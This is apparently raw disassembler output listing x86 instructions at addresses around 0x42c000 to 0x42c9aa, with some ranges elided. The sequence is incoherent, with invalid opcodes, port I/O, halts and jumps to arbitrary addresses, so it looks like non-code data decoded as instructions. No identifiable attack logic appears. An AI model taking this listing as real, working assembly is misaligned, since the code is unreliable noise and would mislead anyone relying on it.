  42c005:	rcl    dh,1
  42c007:	outs   dx,BYTE PTR ds:[esi]
  42c008:	jb     0x42c080
  42c00a:	dec    ebp
  42c00b:	nop
  42c00c:	mov    cl,0x1e
  42c00e:	and    ah,BYTE PTR [ebp+0x0]
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	pop    esi
  42c081:	xchg   edx,eax
  42c082:	sbb    al,0xf4
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	adc    DWORD PTR [edx],edi
  42c08e:	push   esp
  42c08f:	cmp    eax,0x7fa4497c
  42c094:	push   esi
  42c095:	inc    ecx
  42c096:	clc    
  42c097:	jecxz  0x42c02d
  42c099:	fstp   QWORD PTR [ebp-0x6284037c]
  42c09f:	push   edx
  42c0a0:	js     0x42c058
  42c0a2:	dec    esi
  42c0a3:	dec    esi
  42c0a4:	adc    BYTE PTR [ebx+0x3a],dh
  42c0a7:	dec    esi
  42c0a8:	xor    al,0x15
  42c0aa:	add    ebp,DWORD PTR [esi]
  42c0ac:	mov    ah,0xd
  42c0ae:	cwde   
  42c0af:	or     esp,ebx
  42c0b1:	fldcw  WORD PTR [ebx]
  42c0b3:	pop    esi
  42c0b4:	mov    cl,0xc6
  42c0b6:	xchg   ebx,eax
  42c0b7:	fadd   DWORD PTR [esi-0x18748377]
  42c0bd:	repz xor DWORD PTR [esi+0xd],edi
  42c0c1:	cmp    al,0x6e
  42c0c3:	outs   dx,DWORD PTR ds:[esi]
  42c0c4:	xor    DWORD PTR [edx],edi
  42c0c6:	sbb    ebx,esp
  42c0c8:	es in  al,0x59
  42c0cb:	ss mov cl,0xac
  42c0ce:	and    BYTE PTR [ebx-0x60],ch
  42c0d1:	fdivr  st,st(6)
  42c0d3:	sti    
  42c0d4:	push   ebx
  42c0d5:	push   ss
  42c0d6:	fldenv [edx]
  42c0d8:	xchg   ebp,eax
  42c0d9:	sahf   
  42c0da:	fistp  WORD PTR [esi+0x3b]
  42c0dd:	jb     0x42c12d
  42c0df:	pop    esp
  42c0e0:	fsubr  DWORD PTR [edi-0x77]
  42c0e3:	ret    
  42c0e4:	dec    ebp
  42c0e5:	pop    edi
  42c0e6:	add    cl,BYTE PTR ds:0x995e7380
  42c0ec:	dec    BYTE PTR [ebx-0x278733c6]
  42c0f2:	ins    DWORD PTR es:[edi],dx
  42c0f3:	(bad)  [ebx-0x62]
  42c0f6:	cmp    BYTE PTR [edx],ch
  42c0f8:	scas   eax,DWORD PTR es:[edi]
  42c0f9:	xchg   edi,eax
  42c0fa:	xchg   esp,eax
  42c0fb:	fadd   DWORD PTR [ecx+0xf86a8c]
  42c101:	mov    ecx,DWORD PTR [ecx]
  42c103:	and    eax,0x1dd21b53
  42c108:	stos   BYTE PTR es:[edi],al
  42c109:	mov    eax,ds:0xfb4e6172
  42c10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c10f:	(bad)  [esp+ebx*2+0x664bffe7]
  42c116:	outs   dx,BYTE PTR ds:[esi]
  42c117:	push   cs
  42c118:	(bad)  
  42c119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c11a:	jo     0x42c0cc
  42c11c:	adc    ah,BYTE PTR [eax+0x4e]
  42c11f:	dec    edi
  42c120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c121:	sbb    DWORD PTR [edi+0x19],0xffffff9f
  42c125:	cld    
  42c126:	add    ebp,DWORD PTR [eax+0x1f]
  42c129:	mov    ecx,0xadd5b256
  42c12e:	test   BYTE PTR [ecx],dh
  42c130:	sbb    eax,0x364073b3
  42c135:	jns    0x42c11b
  42c137:	dec    esp
  42c138:	sub    BYTE PTR [ecx+esi*1+0x65],bh
  42c13c:	jmp    0x42c0e4
  42c13e:	jbe    0x42c1ae
  42c140:	add    BYTE PTR [edx-0x6ce4956d],ah
  42c146:	add    eax,0xf1d56547
  42c14b:	pop    edi
  42c14c:	gs pop ebp
  42c14e:	(bad)  
  42c14f:	push   ecx
  42c150:	push   0xb521d51
  42c155:	jae    0x42c144
  42c157:	add    bl,al
  42c159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c15a:	mov    ch,0x54
  42c15c:	lock repnz stos DWORD PTR es:[edi],eax
  42c15f:	inc    esi
  42c160:	nop
  42c161:	xchg   ecx,eax
  42c162:	mov    BYTE PTR [ebx-0x20],bh
  42c165:	sub    DWORD PTR [ecx],edx
  42c167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c168:	into   
  42c169:	ins    BYTE PTR es:[edi],dx
  42c16a:	inc    esp
  42c16b:	scas   eax,DWORD PTR es:[edi]
  42c16c:	loop   0x42c1aa
  42c16e:	add    eax,0xd11e5a45
  42c173:	dec    edi
  42c174:	les    eax,FWORD PTR [edx]
  42c176:	push   0xc18237b5
  42c17b:	popw   ss
  42c17d:	hlt    
  42c17e:	gs int 0x20
  42c181:	add    DWORD PTR [ecx-0x65c45201],ecx
  42c187:	pop    ss
  42c188:	push   es
  42c189:	push   edx
  42c18a:	hlt    
  42c18b:	mov    ah,0x1
  42c18d:	pushf  
  42c18e:	ret    
  42c18f:	add    al,BYTE PTR [eax]
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	pushf  
  42c201:	pop    ebx
  42c202:	int3   
  42c203:	sahf   
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	int    0xad
  42c20e:	mov    bh,0x22
  42c210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c211:	adc    eax,0x8d6a55d0
  42c216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c217:	ds pop es
  42c219:	hlt    
  42c21a:	jbe    0x42c268
  42c21c:	pop    esi
  42c21d:	mov    dl,0x44
  42c21f:	pop    esp
  42c220:	sub    DWORD PTR ds:0xdd1aa425,esi
  42c226:	sahf   
  42c227:	fstp   TBYTE PTR [bp+0x4d]
  42c22b:	dec    ebx
  42c22c:	inc    edi
  42c22d:	in     eax,dx
  42c22e:	sbb    DWORD PTR [edx+0x41],eax
  42c231:	cmp    DWORD PTR [eax+0x7e],esi
  42c234:	stos   DWORD PTR es:[edi],eax
  42c235:	pop    es
  42c236:	fild   DWORD PTR [ecx-0xfed5811]
  42c23c:	push   0x307c2e27
  42c241:	push   ecx
  42c242:	jge    0x42c254
  42c244:	bound  ebp,QWORD PTR [edx+0x76]
  42c247:	adc    eax,0xca097e3f
  42c24c:	jb     0x42c28f
  42c24e:	aad    0x1b
  42c250:	in     al,0xb0
  42c252:	cmp    esi,DWORD PTR [esi+0x69d85bc7]
  42c258:	fwait
  42c259:	scas   eax,DWORD PTR es:[edi]
  42c25a:	call   0x77358faf
  42c25f:	add    eax,DWORD PTR gs:[ecx]
  42c262:	inc    eax
  42c263:	out    dx,eax
  42c264:	mov    bh,0xcb
  42c266:	xlat   BYTE PTR ds:[ebx]
  42c267:	push   ecx
  42c268:	fldenv fs:[esi]
  42c26b:	xchg   DWORD PTR [ebx],edi
  42c26d:	stos   BYTE PTR es:[edi],al
  42c26e:	mov    ebx,0x8a37ee4
  42c273:	add    eax,0x793779f7
  42c278:	popa   
  42c279:	xchg   DWORD PTR [ecx],eax
  42c27b:	mov    ecx,0x23c001c8
  42c280:	fbld   TBYTE PTR [ecx]
  42c282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c283:	imul   eax,DWORD PTR [ebx],0xffffffd0
  42c286:	adc    dh,dl
  42c288:	inc    esp
  42c289:	adc    esi,DWORD PTR [edx]
  42c28b:	xlat   BYTE PTR ds:[ebx]
  42c28c:	xor    edi,esi
  42c28e:	and    BYTE PTR [edi+0x73],dh
  42c291:	es ja  0x42c221
  42c294:	stos   BYTE PTR es:[edi],al
  42c295:	fnstsw WORD PTR [edx]
  42c297:	jb     0x42c299
  42c299:	das    
  42c29a:	cmp    eax,0xf2ef24e
  42c29f:	loope  0x42c312
  42c2a1:	retf   
  42c2a2:	ds inc esp
  42c2a4:	popa   
  42c2a5:	jmp    0x42c2dc
  42c2a7:	dec    ebp
  42c2a8:	cli    
  42c2a9:	jg     0x42c237
  42c2ab:	hlt    
  42c2ac:	or     al,0xad
  42c2ae:	mov    es,WORD PTR [edx+ebx*1-0x5b]
  42c2b2:	fptan  
  42c2b4:	xor    ch,BYTE PTR [edi]
  42c2b6:	lds    ecx,FWORD PTR [ebx]
  42c2b8:	jecxz  0x42c275
  42c2ba:	adc    ch,BYTE PTR [edi-0x44]
  42c2bd:	inc    ebx
  42c2be:	lahf   
  42c2bf:	sahf   
  42c2c0:	cmp    al,dl
  42c2c2:	test   eax,0x3dbc3550
  42c2c7:	sbb    edx,ecx
  42c2c9:	repnz int 0x66
  42c2cc:	add    al,0x29
  42c2ce:	sbb    al,0x2
  42c2d0:	and    esi,DWORD PTR [eax+0x26dcfe54]
  42c2d6:	sub    DWORD PTR [edx-0x4a029fcd],edx
  42c2dc:	retf   
  42c2dd:	dec    ebp
  42c2de:	daa    
  42c2df:	ret    
  42c2e0:	xchg   esp,eax
  42c2e1:	idiv   BYTE PTR [eax]
  42c2e3:	or     eax,0x29500941
  42c2e8:	test   BYTE PTR [eax+edx*2+0x3f],ch
  42c2ec:	sar    esi,0x8
  42c2ef:	mov    ebp,0xc702079c
  42c2f4:	pop    ecx
  42c2f5:	push   esi
  42c2f6:	add    al,0x9f
  42c2f8:	(bad)  
  42c2f9:	or     BYTE PTR [eax],dl
  42c2fb:	retf   0xfb7b
  42c2fe:	aad    0x86
  42c300:	inc    ebp
  42c301:	cdq    
  42c302:	inc    esp
  42c303:	in     al,dx
  42c304:	out    0xfb,al
  42c306:	xchg   ebx,eax
  42c307:	leave  
  42c308:	pop    esp
  42c309:	add    BYTE PTR [edx-0x3f],dh
  42c30c:	cmp    eax,DWORD PTR [ebx]
  42c30e:	(bad)  
  42c30f:	je     0x42c311
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xd93ae6f6
  42c383:	add    ebp,eax
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	pop    eax
  42c38d:	jmp    0x42c311
  42c38f:	xchg   esi,eax
  42c390:	adc    BYTE PTR [esi],ah
  42c392:	jns    0x42c3ff
  42c394:	push   edi
  42c395:	push   ecx
  42c396:	add    al,0x54
  42c398:	(bad)  
  42c399:	mov    bh,0xfd
  42c39b:	pushf  
  42c39c:	pop    ds
  42c39d:	adc    bl,BYTE PTR [ebx]
  42c39f:	xchg   esi,esp
  42c3a1:	sbb    BYTE PTR [edi],dh
  42c3a3:	xor    al,0x3b
  42c3a5:	in     eax,dx
  42c3a6:	or     BYTE PTR [ebx-0x2daeb90c],bl
  42c3ac:	ds out 0xf9,al
  42c3af:	pusha  
  42c3b0:	inc    edx
  42c3b1:	sbb    BYTE PTR [ebx-0x79],al
  42c3b4:	pop    esi
  42c3b5:	cmc    
  42c3b6:	xchg   DWORD PTR [edx],ebx
  42c3b8:	cwde   
  42c3b9:	xor    al,0xcd
  42c3bb:	nop
  42c3bc:	push   0x15e70ff6
  42c3c1:	lahf   
  42c3c2:	nop
  42c3c3:	adc    DWORD PTR [eax],eax
  42c3c5:	pusha  
  42c3c6:	ja     0x42c3ee
  42c3c8:	aad    0xd9
  42c3ca:	inc    edi
  42c3cb:	cwde   
  42c3cc:	mov    eax,0xaf6c6104
  42c3d1:	out    0xc2,eax
  42c3d3:	in     eax,dx
  42c3d4:	lds    edx,FWORD PTR [ecx+eiz*2-0x80]
  42c3d8:	aas    
  42c3d9:	jl     0x42c3f0
  42c3db:	xor    al,0x73
  42c3dd:	loope  0x42c431
  42c3df:	xchg   ebp,eax
  42c3e0:	hlt    
  42c3e1:	sub    ebx,DWORD PTR [ecx+0x59]
  42c3e4:	(bad)  
  42c3e5:	ss mov ch,0xd3
  42c3e8:	xlat   BYTE PTR ds:[ebx]
  42c3e9:	cdq    
  42c3ea:	jb     0x42c3c5
  42c3ec:	pop    ecx
  42c3ed:	mov    esp,0xcb4d07fa
  42c3f2:	stc    
  42c3f3:	mov    esi,0x891097f2
  42c3f8:	out    0x4b,al
  42c3fa:	mov    bl,0xe9
  42c3fc:	jae    0x42c3fa
  42c3fe:	add    ecx,eax
  42c400:	mov    DWORD PTR [edi-0x66b4748c],ecx
  42c406:	fistp  DWORD PTR [ecx-0x556af1a7]
  42c40c:	loopne 0x42c395
  42c40e:	cld    
  42c40f:	xchg   edi,eax
  42c410:	ret    
  42c411:	in     eax,dx
  42c412:	pop    ecx
  42c413:	pop    ss
  42c414:	pop    edi
  42c416:	cmp    al,0x8c
  42c418:	pop    edi
  42c419:	call   0xa8b5b5f2
  42c41e:	jge    0x42c3c7
  42c420:	aam    0xa6
  42c422:	icebp  
  42c423:	fsub   st(1),st
  42c425:	mov    ds:0x29f0affe,eax
  42c42a:	xchg   ebp,eax
  42c42b:	push   ecx
  42c42c:	scas   al,BYTE PTR es:[edi]
  42c42d:	fnstcw WORD PTR ds:0x7f9c4db7
  42c433:	std    
  42c434:	cmc    
  42c435:	test   DWORD PTR [ebx+0x7cda4ca2],edi
  42c43b:	mov    ah,0xa2
  42c43d:	inc    edx
  42c43e:	push   edx
  42c43f:	and    eax,0x84dcc52e
  42c444:	or     al,0xc
  42c446:	add    DWORD PTR [edi],esi
  42c448:	jg     0x42c3f3
  42c44a:	fidivr WORD PTR [edx-0x1a]
  42c44d:	je     0x42c447
  42c44f:	test   DWORD PTR [ebx-0x70b17eac],0x4f868be1
  42c459:	pop    es
  42c45a:	cli    
  42c45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c45c:	jecxz  0x42c462
  42c45e:	xchg   ecx,eax
  42c45f:	push   0xffffffe3
  42c461:	and    BYTE PTR [edi+eax*4-0x7d50588c],dh
  42c468:	(bad)  
  42c469:	mov    DWORD PTR [edi-0x36],ecx
  42c46c:	push   edx
  42c46d:	xor    al,bh
  42c46f:	repnz (bad) 
  42c471:	cmp    DWORD PTR [edx+ebx*8],esi
  42c474:	sbb    eax,0xc80d91de
  42c479:	or     DWORD PTR [edi+eiz*1-0x678379ec],eax
  42c480:	cs pop ebp
  42c482:	ja     0x42c46c
  42c484:	fidivr WORD PTR [ecx-0x73]
  42c487:	lds    esp,FWORD PTR [edx]
  42c489:	sbb    BYTE PTR [edx],ah
  42c48b:	outs   dx,DWORD PTR ds:[esi]
  42c48c:	or     bl,BYTE PTR [edx]
  42c48e:	repz cdq 
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x7034,0x89
  42c502:	mov    bh,0x19
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	adc    al,0xf9
  42c50e:	fwait
  42c50f:	mov    BYTE PTR [ebx+0x17fe685a],cl
  42c515:	daa    
  42c516:	push   es
  42c517:	jg     0x42c4b0
  42c519:	mov    cs,WORD PTR [edx-0x51]
  42c51c:	adc    BYTE PTR [edi],bl
  42c51e:	stos   BYTE PTR es:[edi],al
  42c51f:	mov    ecx,0xe9154c1d
  42c524:	or     ebx,ebx
  42c526:	xor    eax,0xb55b7228
  42c52b:	cld    
  42c52c:	pop    ss
  42c52d:	dec    ecx
  42c52e:	loopne 0x42c589
  42c530:	jbe    0x42c4fc
  42c532:	mov    ah,ah
  42c534:	jns    0x42c578
  42c536:	jnp    0x42c513
  42c538:	mov    ds:0xaa588e4a,eax
  42c53d:	sub    ecx,0xb4b97926
  42c543:	push   edx
  42c544:	pop    ebp
  42c545:	xor    BYTE PTR [ebx+edx*2-0xc05d8dd],cl
  42c54c:	mov    ch,0x3e
  42c54e:	adc    BYTE PTR [edx+0x74],al
  42c551:	rcr    BYTE PTR [edx],0x12
  42c554:	fwait
  42c555:	(bad)  
  42c556:	pop    ebp
  42c557:	sub    dh,ch
  42c559:	xchg   edi,eax
  42c55a:	ins    DWORD PTR es:[edi],dx
  42c55b:	cld    
  42c55c:	push   eax
  42c55d:	je     0x42c568
  42c55f:	sti    
  42c560:	shl    DWORD PTR [eax-0x52fea3d8],1
  42c566:	in     al,dx
  42c567:	loopne 0x42c4fa
  42c569:	repz and DWORD PTR [ecx-0x2],0x56
  42c56e:	cmp    BYTE PTR [ecx],al
  42c570:	and    cl,BYTE PTR [esi-0x62]
  42c573:	add    edi,DWORD PTR [esi]
  42c575:	cdq    
  42c576:	jne    0x42c54f
  42c578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c579:	outs   dx,BYTE PTR ds:[esi]
  42c57a:	popf   
  42c57b:	repnz es pop esp
  42c57e:	stos   DWORD PTR es:[edi],eax
  42c57f:	(bad)  
  42c580:	bound  edx,QWORD PTR [edx+ecx*4-0x2f]
  42c584:	lods   eax,DWORD PTR ds:[esi]
  42c585:	or     DWORD PTR [ebx-0x5d],0x11897263
  42c58c:	cs inc ebp
  42c58e:	adc    bh,al
  42c590:	adc    BYTE PTR ds:0xcdfd254d,0x88
  42c597:	mov    eax,0x9d1ae9f4
  42c59c:	(bad)  
  42c59d:	aad    0x89
  42c59f:	cmp    eax,0x294b0516
  42c5a4:	aas    
  42c5a5:	sub    eax,0x99c23b08
  42c5aa:	es xchg ebp,eax
  42c5ac:	dec    edi
  42c5ad:	mov    edi,DWORD PTR [esi+0x7b]
  42c5b0:	test   eax,0x15b8577c
  42c5b5:	jg     0x42c632
  42c5b7:	fwait
  42c5b8:	mov    BYTE PTR [esi+0x1f1381ae],0x6a
  42c5bf:	sbb    al,0x7f
  42c5c2:	stos   BYTE PTR es:[edi],al
  42c5c3:	cmp    eax,0x10096738
  42c5c8:	repnz scas eax,DWORD PTR es:[edi]
  42c5ca:	fdiv   DWORD PTR [esi+ebp*4+0x855f14f]
  42c5d1:	pop    edx
  42c5d2:	(bad)  
  42c5d3:	sbb    BYTE PTR [edi-0x19],al
  42c5d6:	rcl    BYTE PTR [esp+esi*2+0x61],1
  42c5da:	addr16 cmp al,0xf2
  42c5dd:	mov    es,WORD PTR [ebx+ecx*4-0x8]
  42c5e1:	mov    eax,ds:0xca67e289
  42c5e6:	enter  0x6924,0x53
  42c5ea:	add    BYTE PTR [eax-0x40ae6e81],bl
  42c5f0:	or     ebx,edx
  42c5f2:	stc    
  42c5f3:	test   BYTE PTR ds:0xc0133d9b,bl
  42c5f9:	push   eax
  42c5fa:	jmp    0xfe0fb6d2
  42c5ff:	xor    ebp,ebp
  42c601:	mov    esi,0x263ccae8
  42c606:	pop    esp
  42c607:	push   ecx
  42c608:	repz imul DWORD PTR ds:0x18634304
  42c60f:	or     al,0x0
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x25920395]
  42c681:	stos   DWORD PTR es:[edi],eax
  42c682:	popa   
  42c683:	data16 lock fiadd DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	push   edx
  42c68d:	out    dx,al
  42c68e:	mov    al,0xe5
  42c690:	jp     0x42c6bf
  42c692:	mov    bl,0x23
  42c694:	ds inc ebp
  42c696:	add    eax,0x7deb9197
  42c69b:	jp     0x42c627
  42c69d:	sahf   
  42c69e:	lods   al,BYTE PTR ds:[esi]
  42c69f:	test   DWORD PTR [esi+eiz*1-0x313c093],esp
  42c6a6:	rcr    DWORD PTR gs:[edi],cl
  42c6a9:	adc    edi,DWORD PTR [ebx+esi*4+0x50ab2787]
  42c6b0:	mov    eax,0xf99365ee
  42c6b5:	call   0xa249e2b7
  42c6ba:	pop    ds
  42c6bb:	(bad)
  42c6c0:	test   BYTE PTR [ebx],ch
  42c6c2:	(bad)  
  42c6c4:	scas   al,BYTE PTR es:[edi]
  42c6c5:	pusha  
  42c6c6:	xchg   edi,eax
  42c6c7:	nop
  42c6c8:	shr    DWORD PTR [esi],1
  42c6ca:	and    eax,0xcab89664
  42c6cf:	fidivr DWORD PTR ds:0x81e44423
  42c6d5:	pop    esi
  42c6d6:	jg     0x42c6dd
  42c6d8:	retf   
  42c6d9:	mov    bl,0xe0
  42c6db:	test   eax,0x25e1fabb
  42c6e0:	fcomp  DWORD PTR [edi-0x15037c4b]
  42c6e6:	pop    edx
  42c6e7:	or     al,0x10
  42c6e9:	xor    eax,0x5366eb9
  42c6ee:	jb     0x42c6ca
  42c6f0:	fld    QWORD PTR [ecx+0x7f363080]
  42c6f6:	sbb    DWORD PTR ds:0x621386dd,ebp
  42c6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6fd:	push   0x4
  42c6ff:	pop    esi
  42c700:	or     edx,DWORD PTR [eax+0x51]
  42c703:	stos   DWORD PTR es:[edi],eax
  42c704:	cld    
  42c705:	lds    ecx,FWORD PTR [ebx+0x3e6db608]
  42c70b:	push   edx
  42c70c:	popa   
  42c70d:	sub    ebx,DWORD PTR [esp+ebx*1-0x61]
  42c711:	call   DWORD PTR [ecx-0x27208b4f]
  42c717:	out    dx,eax
  42c718:	aad    0xdb
  42c71a:	xor    BYTE PTR [ecx+eax*2-0xb],dl
  42c71e:	fcmovbe st,st(5)
  42c720:	in     al,0x66
  42c722:	and    al,0x6b
  42c724:	inc    ecx
  42c725:	mov    ss,WORD PTR [edi-0x17dc3d5]
  42c72b:	fs in  al,dx
  42c72d:	pop    esp
  42c72e:	xchg   edx,eax
  42c72f:	xchg   ebp,eax
  42c730:	fisubr DWORD PTR [edx]
  42c732:	mov    cl,BYTE PTR [eax+edx*8]
  42c735:	fcom   DWORD PTR [ecx]
  42c737:	or     cl,BYTE PTR ds:0xdca31258
  42c73d:	push   ss
  42c73e:	mov    eax,0x65db3ba6
  42c743:	aaa    
  42c744:	pop    ds
  42c745:	cmp    eax,0xc41daae4
  42c74a:	add    cl,BYTE PTR [ecx+0x45]
  42c74d:	mov    bl,0x8e
  42c74f:	or     edx,DWORD PTR [edi+0x5a]
  42c752:	outs   dx,DWORD PTR ds:[esi]
  42c753:	pop    esp
  42c754:	and    al,0x7d
  42c756:	retf   
  42c757:	iret   
  42c758:	push   edi
  42c759:	scas   eax,DWORD PTR es:[edi]
  42c75a:	mov    BYTE PTR [esp+ecx*4-0x61],ch
  42c75e:	fadd   DWORD PTR ds:0xd5774b7c
  42c764:	fdiv   QWORD PTR [ebp+0x3d]
  42c767:	rcr    BYTE PTR [esi],cl
  42c769:	es cmp eax,0xb17eef0f
  42c76f:	adc    al,0x37
  42c771:	repnz dec ecx
  42c773:	sbb    DWORD PTR [ebx],edx
  42c775:	push   0x55
  42c777:	in     eax,dx
  42c778:	inc    eax
  42c779:	inc    eax
  42c77a:	dec    edx
  42c77b:	or     al,0xfc
  42c77d:	cld    
  42c77e:	inc    edx
  42c77f:	mov    ah,0x6a
  42c781:	adc    ebp,ebp
  42c783:	loop   0x42c777
  42c785:	arpl   WORD PTR [ebx+ebp*1],bx
  42c788:	adc    ebp,DWORD PTR [eax-0x7d]
  42c78b:	test   al,0xa0
  42c78d:	in     al,0x65
  42c78f:	pop    DWORD PTR [eax]
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xc318a40e
  42c802:	in     al,0x39
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	xchg   ebx,eax
  42c80d:	sub    ebp,DWORD PTR [eax+0x2a]
  42c810:	or     ebx,eax
  42c812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c813:	cld    
  42c814:	adc    dl,BYTE PTR [eax-0x2c]
  42c817:	out    dx,al
  42c818:	(bad)  
  42c819:	mov    ch,0xd4
  42c81b:	xlat   BYTE PTR ds:[ebx]
  42c81c:	call   0x8d66:0x7e2255e1
  42c823:	push   esi
  42c824:	or     DWORD PTR [edi],esi
  42c826:	mov    ch,0x6a
  42c828:	sub    edx,DWORD PTR [eax-0x3e]
  42c82b:	inc    esp
  42c82c:	xchg   ecx,eax
  42c82d:	inc    esp
  42c82e:	mov    ?,WORD PTR [ecx+edx*4-0x1b0b8e3f]
  42c835:	in     al,dx
  42c836:	jle    0x42c85d
  42c838:	clc    
  42c839:	dec    esp
  42c83a:	xor    eax,0xdd8d046a
  42c83f:	aad    0xa3
  42c841:	clc    
  42c842:	mov    al,ds:0xd991a9c0
  42c847:	rcr    DWORD PTR [si],cl
  42c84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c84b:	lock push ebp
  42c84d:	jmp    0x42c895
  42c84f:	push   0xffffffac
  42c851:	jb     0x42c7d5
  42c853:	cmc    
  42c854:	jb     0x42c809
  42c856:	mov    ds:0x8db59998,al
  42c85b:	sub    al,0x70
  42c85d:	js     0x42c827
  42c85f:	push   eax
  42c860:	sub    DWORD PTR [esi+0x29],0x288b144c
  42c867:	imul   DWORD PTR [eax+0x20]
  42c86a:	nop
  42c86b:	aas    
  42c86c:	adc    ecx,DWORD PTR [ebp+edx*8-0x2f]
  42c870:	imul   esp,edi,0x29310342
  42c876:	cmc    
  42c877:	pop    es
  42c878:	scas   al,BYTE PTR es:[edi]
  42c879:	push   0xbeef8395
  42c87e:	pusha  
  42c87f:	mov    eax,ds:0x8ae72e6b
  42c884:	push   0x27
  42c886:	cmp    ebp,ebx
  42c888:	test   al,0xd2
  42c88a:	lods   al,BYTE PTR ds:[esi]
  42c88b:	sbb    BYTE PTR [edx+edi*1],bh
  42c88e:	(bad)  
  42c890:	out    dx,al
  42c891:	not    cl
  42c893:	add    eax,0xae1f139e
  42c898:	push   edx
  42c899:	(bad)  
  42c89a:	(bad)  
  42c89b:	xchg   ecx,eax
  42c89c:	es out 0xc1,al
  42c89f:	mov    esp,0x2733b81a
  42c8a4:	pusha  
  42c8a5:	sbb    eax,0xa628c42e
  42c8aa:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42c8ac:	js     0x42c92c
  42c8ae:	in     al,dx
  42c8af:	inc    edx
  42c8b0:	adc    ebp,DWORD PTR [ebx-0x47f42d19]
  42c8b6:	cmp    esp,DWORD PTR [ebp-0x61]
  42c8b9:	cld    
  42c8ba:	push   ecx
  42c8bb:	mov    ecx,0xa2fc842
  42c8c0:	mov    edx,0xc722b143
  42c8c5:	cld    
  42c8c6:	and    DWORD PTR ds:0x5ab40866,0x9aeea94c
  42c8d0:	mov    fs,WORD PTR [ebp+0x49015045]
  42c8d6:	sbb    ch,bl
  42c8d8:	cmovns ebp,DWORD PTR [ebx-0x35f67a7d]
  42c8df:	test   al,0x4c
  42c8e1:	push   0x334ade14
  42c8e6:	adc    esp,DWORD PTR [ebp-0x64455d6a]
  42c8ec:	cdq    
  42c8ed:	into   
  42c8ee:	mov    eax,ds:0xd99d0a2e
  42c8f3:	lods   eax,DWORD PTR ds:[esi]
  42c8f4:	pop    DWORD PTR [esi+0x6]
  42c8f7:	mov    ch,0xf4
  42c8f9:	jmp    0x42c96b
  42c8fb:	enter  0x707f,0x99
  42c8ff:	data16 (bad) 
  42c902:	adc    BYTE PTR [edx-0x72],0x99
  42c906:	jae    0x42c89f
  42c908:	cs inc ecx
  42c90a:	xor    al,0x3d
  42c90c:	mov    dh,0x1b
  42c90e:	int3   
  42c90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x431d8b22
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	push   ds
  42c98d:	pop    ecx
  42c98e:	pop    ebx
  42c98f:	cmp    DWORD PTR [ebp+0x7c3899e6],0xffffffd7
  42c996:	mov    edx,0x5bb0b3fe
  42c99b:	stc    
  42c99c:	das    
  42c99d:	pop    esi
  42c99e:	mov    esi,0x94999975
  42c9a3:	jbe    0x42c951
  42c9a5:	mov    al,ds:0x67c55755
  42c9aa:	push   eax
